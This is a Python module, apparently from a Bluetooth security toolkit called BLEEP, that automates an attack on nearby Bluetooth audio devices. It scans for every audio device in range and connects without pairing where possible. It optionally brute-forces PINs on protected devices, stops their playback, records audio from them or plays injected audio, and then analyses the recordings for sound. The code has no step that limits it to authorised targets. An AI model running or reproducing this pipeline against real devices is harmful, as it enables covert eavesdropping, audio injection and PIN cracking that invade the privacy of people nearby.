"""Amusica full-auto orchestrator — five-stage autonomous audio pipeline.

Stage 1: Scan & classify (audio UUID filter)
Stage 2: Connection test & triage (JustWorks vs auth-required vs profile-unavailable)
Stage 3: Optional PIN brute-force for protected targets
Stage 4: Record & playback per accessible target
Stage 5: Post-test analysis of recordings

Reuses existing BLEEP primitives throughout; this module is pure
orchestration logic with no new Bluetooth protocol code.
"""

from __future__ import annotations

import os
import shutil
import subprocess
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

from bleep.core.log import print_and_log, LOG__DEBUG, LOG__GENERAL, LOG__USER

__all__ = ["run_amusica_full_auto", "RecordingResult", "AutoResult"]


# ---------------------------------------------------------------------------
# Result data classes
# ---------------------------------------------------------------------------

@dataclass
class RecordingResult:
    """Analysis of a single recording file."""
    path: str
    has_audio: bool = False
    duration_sec: float = 0.0
    max_amplitude: float = 0.0
    error: Optional[str] = None


@dataclass
class TargetResult:
    """Per-device outcome from the full-auto pipeline."""
    address: str
    name: str = ""
    category: str = ""  # justworks | auth_required | profile_unavailable | brute_ok | failed
    pin_found: Optional[str] = None
    recordings: List[RecordingResult] = field(default_factory=list)
    recon: Optional[Dict[str, Any]] = None
    error: Optional[str] = None


@dataclass
class AutoResult:
    """Aggregate result from the full pipeline run."""
    targets_scanned: int = 0
    justworks: int = 0
    auth_required: int = 0
    profile_unavailable: int = 0
    brute_ok: int = 0
    failed: int = 0
    recordings_total: int = 0
    recordings_with_audio: int = 0
    per_target: List[TargetResult] = field(default_factory=list)
    elapsed_seconds: float = 0.0


# ---------------------------------------------------------------------------
# Stage 5 helper: analyse recordings with sox
# ---------------------------------------------------------------------------

def analyze_recordings(paths: List[str]) -> List[RecordingResult]:
    """Analyse WAV files using ``sox`` for audio presence detection."""
    sox_bin = shutil.which("sox")
    soxi_bin = shutil.which("soxi")
    results: List[RecordingResult] = []

    for p in paths:
        rr = RecordingResult(path=p)
        if not os.path.isfile(p):
            rr.error = "file_not_found"
            results.append(rr)
            continue

        if soxi_bin:
            try:
                dur_out = subprocess.run(
                    [soxi_bin, "-D", p],
                    capture_output=True, text=True, timeout=5,
                )
                rr.duration_sec = float(dur_out.stdout.strip() or "0")
            except Exception:
                pass

        if sox_bin:
            try:
                stat_out = subprocess.run(
                    [sox_bin, p, "-n", "stat"],
                    capture_output=True, text=True, timeout=10,
                )
                combined = (stat_out.stdout or "") + (stat_out.stderr or "")
                for line in combined.splitlines():
                    if "Maximum amplitude" in line and ":" in line:
                        val = float(line.split(":")[-1].strip())
                        rr.max_amplitude = max(rr.max_amplitude, abs(val))
                    elif "Minimum amplitude" in line and ":" in line:
                        val = float(line.split(":")[-1].strip())
                        rr.max_amplitude = max(rr.max_amplitude, abs(val))
                rr.has_audio = rr.max_amplitude > 0.0
            except Exception as exc:
                rr.error = str(exc)
        else:
            rr.error = "sox_not_found"

        results.append(rr)

    return results


# ---------------------------------------------------------------------------
# Main orchestrator
# ---------------------------------------------------------------------------

def run_amusica_full_auto(
    *,
    scan_timeout: int = 15,
    adapter_name: Optional[str] = None,
    brute: bool = False,
    brute_depth: int = 50,
    record_duration: int = 8,
    record_dir: str = "/tmp",
    test_file: Optional[str] = None,
) -> AutoResult:
    """Execute the five-stage autonomous audio pipeline.

    Parameters
    ----------
    scan_timeout : int
        Duration for the initial scan (seconds).
    adapter_name : str | None
        HCI adapter override.
    brute : bool
        If True, attempt PIN brute-force on auth-required targets.
    brute_depth : int
        Max PIN attempts per protected target.
    record_duration : int
        Recording duration per audio interface (seconds).
    record_dir : str
        Directory for recordings.
    test_file : str | None
        Audio file for playback testing during recon.
    """
    t0 = time.monotonic()
    auto = AutoResult()

    # ── Stage 1: Scan & Classify ──────────────────────────────────────
    print_and_log("\n[=== Stage 1: Scan & Classify ===]", LOG__USER)
    from bleep.ble_ops.audio.amusica import scan_audio_targets
    targets = scan_audio_targets(timeout=scan_timeout, adapter_name=adapter_name)
    auto.targets_scanned = len(targets)

    if not targets:
        print_and_log("[!] No audio-capable devices found — pipeline complete", LOG__USER)
        auto.elapsed_seconds = time.monotonic() - t0
        return auto

    # ── Stage 2: Connection Test & Triage ─────────────────────────────
    print_and_log("\n[=== Stage 2: Connection Test & Triage ===]", LOG__USER)
    from bleep.ble_ops.audio.amusica import attempt_justworks_connect

    justworks_targets: List[Dict[str, Any]] = []
    protected_targets: List[Dict[str, Any]] = []
    unavailable_targets: List[Dict[str, Any]] = []

    for target in targets:
        mac = target.get("address", "")
        name = target.get("name") or target.get("alias") or mac
        tr = TargetResult(address=mac, name=name)

        conn = attempt_justworks_connect(mac)
        target["connection"] = conn

        if conn.get("connected"):
            tr.category = "justworks"
            justworks_targets.append(target)
            auto.justworks += 1
            print_and_log(f"  [+] {name} ({mac}): JustWorks OK", LOG__USER)
        elif conn.get("auth_required"):
            tr.category = "auth_required"
            protected_targets.append(target)
            auto.auth_required += 1
            print_and_log(f"  [!] {name} ({mac}): authentication required", LOG__USER)
        elif conn.get("error") == "profile_unavailable":
            tr.category = "profile_unavailable"
            unavailable_targets.append(target)
            auto.profile_unavailable += 1
            print_and_log(f"  [-] {name} ({mac}): profile unavailable", LOG__USER)
        else:
            tr.category = "failed"
            tr.error = conn.get("error", "unknown")
            auto.failed += 1
            print_and_log(f"  [-] {name} ({mac}): failed — {tr.error}", LOG__USER)

        auto.per_target.append(tr)

    # ── Stage 3: Optional PIN Brute-Force ─────────────────────────────
    if brute and protected_targets:
        print_and_log(
            f"\n[=== Stage 3: PIN Brute-Force ({len(protected_targets)} target(s)) ===]",
            LOG__USER,
        )
        _stage3_brute(
            protected_targets, justworks_targets, auto,
            brute_depth=brute_depth,
        )
    elif protected_targets:
        print_and_log(
            f"\n[=== Stage 3: Skipped (--brute not set; "
            f"{len(protected_targets)} protected target(s)) ===]",
            LOG__USER,
        )

    # ── Stage 4: Record & Playback ────────────────────────────────────
    accessible = justworks_targets  # brute_ok targets are appended in _stage3
    if accessible:
        print_and_log(
            f"\n[=== Stage 4: Record & Playback ({len(accessible)} target(s)) ===]",
            LOG__USER,
        )
        _stage4_record(
            accessible, auto,
            test_file=test_file,
            record_duration=record_duration,
            record_dir=record_dir,
        )
    else:
        print_and_log("\n[=== Stage 4: Skipped (no accessible targets) ===]", LOG__USER)

    # ── Stage 5: Post-Test Analysis ───────────────────────────────────
    all_paths = []
    for tr in auto.per_target:
        for rec in tr.recordings:
            all_paths.append(rec.path)

    if all_paths:
        print_and_log(
            f"\n[=== Stage 5: Analysis ({len(all_paths)} recording(s)) ===]",
            LOG__USER,
        )
        analysed = analyze_recordings(all_paths)
        path_to_result = {r.path: r for r in analysed}
        for tr in auto.per_target:
            for i, rec in enumerate(tr.recordings):
                if rec.path in path_to_result:
                    tr.recordings[i] = path_to_result[rec.path]

        auto.recordings_total = len(all_paths)
        auto.recordings_with_audio = sum(1 for r in analysed if r.has_audio)
        print_and_log(
            f"  [+] {auto.recordings_with_audio}/{auto.recordings_total} "
            f"recording(s) contain audio content",
            LOG__USER,
        )
    else:
        print_and_log("\n[=== Stage 5: Skipped (no recordings) ===]", LOG__USER)

    auto.elapsed_seconds = time.monotonic() - t0
    return auto


# ---------------------------------------------------------------------------
# Stage 3 internals
# ---------------------------------------------------------------------------

def _stage3_brute(
    protected: List[Dict[str, Any]],
    justworks: List[Dict[str, Any]],
    auto: AutoResult,
    *,
    brute_depth: int = 50,
) -> None:
    """Attempt PIN brute-force on each protected target."""
    import dbus
    from bleep.dbuslayer.pin_brute import PinBruteForcer

    bus = dbus.SystemBus()
    bruter = PinBruteForcer(bus, max_attempts=brute_depth)

    for target in protected:
        mac = target.get("address", "")
        name = target.get("name") or target.get("alias") or mac
        print_and_log(f"\n  [*] Brute-forcing {name} ({mac})…", LOG__USER)

        result = bruter.run_pin_brute(mac)

        tr = _find_target_result(auto, mac)
        if result.success:
            tr.category = "brute_ok"
            tr.pin_found = result.pin
            justworks.append(target)  # now accessible
            auto.brute_ok += 1
            auto.auth_required -= 1
            print_and_log(
                f"  [+] PIN found for {mac}: {result.pin} "
                f"({result.attempts} attempts, {result.elapsed_seconds:.1f}s)",
                LOG__USER,
            )
        else:
            print_and_log(
                f"  [-] Brute-force exhausted for {mac} "
                f"({result.attempts} attempts, {result.stopped_reason})",
                LOG__USER,
            )


# ---------------------------------------------------------------------------
# Stage 4 internals
# ---------------------------------------------------------------------------

def _stage4_record(
    accessible: List[Dict[str, Any]],
    auto: AutoResult,
    *,
    test_file: Optional[str] = None,
    record_duration: int = 8,
    record_dir: str = "/tmp",
) -> None:
    """Run audio recon + record/playback on each accessible target."""
    from bleep.ble_ops.audio.audio_recon import run_audio_recon
    from bleep.ble_ops.audio.audio_tools import AudioToolsHelper

    helper = AudioToolsHelper()

    for target in accessible:
        mac = target.get("address", "")
        name = target.get("name") or target.get("alias") or mac
        print_and_log(f"\n  [*] Audio recon on {name} ({mac})…", LOG__USER)

        tr = _find_target_result(auto, mac)

        # Halt existing playback so our recording captures silence/injection
        try:
            helper.halt_audio_for_device(mac)
        except Exception as exc:
            print_and_log(f"  [!] Halt failed (continuing): {exc}", LOG__DEBUG)

        recon = run_audio_recon(
            mac_filter=mac,
            test_file=test_file,
            do_play=test_file is not None,
            do_record=True,
            record_duration_sec=record_duration,
            record_dir=record_dir,
        )
        tr.recon = recon

        for rec_entry in recon.get("recordings", []):
            path = rec_entry.get("path", "")
            if path:
                tr.recordings.append(RecordingResult(
                    path=path,
                    has_audio=rec_entry.get("has_audio", False),
                ))

        ifaces = (
            sum(len(c.get("profiles", [])) for c in recon.get("cards", []))
            + len(recon.get("bluealsa_pcms", []))
        )
        print_and_log(
            f"  [+] {name}: {ifaces} interface(s), "
            f"{len(tr.recordings)} recording(s)",
            LOG__USER,
        )


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _find_target_result(auto: AutoResult, mac: str) -> TargetResult:
    """Locate the TargetResult for *mac*, creating one if absent."""
    mac_norm = mac.replace(":", "").upper()
    for tr in auto.per_target:
        if tr.address.replace(":", "").upper() == mac_norm:
            return tr
    tr = TargetResult(address=mac)
    auto.per_target.append(tr)
    return tr
